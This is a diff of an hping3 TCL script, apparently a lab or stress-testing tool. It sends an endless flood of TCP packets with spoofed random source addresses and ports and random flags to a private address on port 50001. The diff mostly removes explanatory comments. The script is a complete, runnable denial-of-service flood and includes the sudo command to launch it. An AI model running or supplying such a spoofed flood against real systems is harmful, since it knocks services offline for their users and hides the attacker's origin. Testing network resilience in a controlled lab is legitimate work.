@@ -1,5 +1,4 @@
 # Hping3 TCP Random Flags Flood with TCL script
-# TCP Flood (rand source IP/port, dest port 50001, random TCP flags, window=8192, seq=0, no payload) for hping3 TCL mode
 
 set dst_ip "192.168.100.2"
 set dst_port 50001
@@ -10,12 +9,10 @@ set count 0
 # List of possible TCP flags (s=SYN, f=FIN, r=RST, p=PSH, a=ACK, u=URG, y=ECN/CWR, e=ECE)
 set flags_list {s f r p a u y e}
 
-# Function to generate random IP address
 proc random_ip {} {
     return "[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}].[expr {int(rand()*256)}]"
 }
 
-# Function to generate random source port (1024–65535)
 proc random_port {} {
     return [expr {int(rand()*64512) + 1024}]
 }
@@ -50,14 +47,13 @@ while {1} {
     set saddr [random_ip]
     set sport [random_port]
     set flags [random_flags]
-    # TCP packet: random source IP/port, dest port 50001, random flags, window 8192, seq 0, no payload
     set pkt "ip(saddr=$saddr,daddr=$dst_ip,ttl=64)+tcp(sport=$sport,dport=$dst_port,flags=$flags,win=$window,seq=$seq)"
     hping send $pkt
     incr count
-    # Print every 1000 packets sent
+
     if {[expr {$count % 1000}] == 0} {
         puts "$count TCP random-flags packets sent so far..."
     }
 }
 
-# To run: sudo hping3 exec tcp_random_flags.htcl
+# Comando: sudo hping3 exec tcp_random_flags.htcl
